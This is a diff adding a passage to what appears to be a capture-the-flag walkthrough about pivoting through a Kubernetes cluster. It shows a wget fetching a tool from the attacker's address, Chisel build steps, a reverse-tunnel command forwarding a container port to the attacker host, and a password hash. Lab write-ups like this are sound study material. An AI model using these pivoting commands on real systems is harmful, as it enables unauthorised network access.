@@ -184,9 +184,31 @@ wget http://10.10.14.200:8080/kubeclt -O /tmp/kubeclt
 The way kubernetes cluster works by having one or more nodes, each of these nodes have one or more pods. Each pods can have one or more container. 
 and we learn there are three pods with a container running
 
+We are looking at two `different` environments, the classic production `environment` and the development `environment`. I should be able to repeat the steps i just have to make the `RHOST` and `RPORT` variables and upload them to the container I’m `currently` in above to get another foothold in the `development` environment.
+
+For that we need to `forward` the port to the devnode-deployment container `"172.17.0.4:3000"`
+
+I am using `Chisel` for that, a tcp/upd tunnel written in go.
+
+if you do not have go installed 
+````bash
+apt install golang-go
+````
 
 
+````bash
+git clone https://github.com/jpillora/chisel.get
+cd chisel 
+go build
+````
 
+transfer the new file onto the box
+
+````bash
+./chisels client 10.10.14.200:9999 R:3000:172.17.0.4:3000
+````
+
+We have now created a connection to box. 
 
 
 Hash -> $6$.hk3Zm.2qShoCbQK$LM95a1qtDhEtLPGorD8FmMY5pNef7WfodyUUaw9tikXkh8v/.qmhJPIEV40KYehroJybb4C12gLfQu0UsbFe80
